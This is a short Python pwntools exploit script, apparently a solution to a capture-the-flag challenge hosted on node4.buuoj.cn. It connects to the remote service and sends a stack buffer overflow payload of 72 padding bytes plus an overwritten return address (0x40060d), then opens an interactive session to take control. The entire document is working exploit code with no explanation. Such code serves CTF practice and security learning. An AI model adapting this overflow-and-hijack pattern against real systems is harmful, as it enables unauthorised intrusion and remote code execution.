# exp

```python
# coding=utf-8
from pwn import *

context.os='linux'
context.arch='amd64'
context.log_level='debug'

p = remote('node4.buuoj.cn', 27947)
payload = b'a'*(64+8) + p64(0x40060d)

p.sendline(payload)
p.interactive()
```